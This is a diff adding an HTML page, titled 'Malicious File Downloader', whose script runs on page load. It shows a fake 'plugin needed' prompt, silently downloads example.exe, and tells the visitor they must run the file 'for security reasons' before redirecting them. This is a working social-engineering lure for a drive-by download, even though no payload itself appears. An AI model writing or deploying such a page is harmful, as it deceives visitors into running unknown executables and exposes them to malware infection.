@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious File Downloader</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        #downloadMsg {
+            color: red;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to the Malicious File Downloader</h1>
+    <p>Your download will start automatically.</p>
+    <p id="downloadMsg"></p>
+
+    <script>
+        window.addEventListener('load', () => {
+            if (confirm('A plugin is needed to view this website properly. You must download and install example.exe for this plugin to work.')) {
+                const a = document.createElement('a');
+                a.href = '/download';
+                a.download = 'example.exe';
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                document.getElementById('downloadMsg').innerText = 'The file has been downloaded. For security reasons, you must manually execute the file.';
+
+                setTimeout(() => {
+                    window.location.href = '/redirect_after_download';
+                }, 1000); // Adjust the timeout as needed
+            } else {
+                window.location.href = '/broken';
+            }
+        });
+    </script>
+</body>
+</html>
